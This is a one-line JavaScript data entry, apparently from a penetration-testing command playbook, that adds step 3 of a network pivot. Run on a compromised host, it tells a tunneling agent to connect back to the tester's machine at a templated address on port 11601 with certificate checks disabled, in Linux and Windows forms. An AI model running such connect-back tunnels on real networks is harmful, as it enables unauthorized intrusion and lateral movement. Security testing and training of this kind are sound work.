Object.assign(n[7985],{"tool":"sh","run":"./agent -connect {{lhost}}:11601 -ignore-cert","note":"STEP 3 (on the pivot): connect back. Windows: agent.exe -connect {{lhost}}:11601 -ignore-cert"});
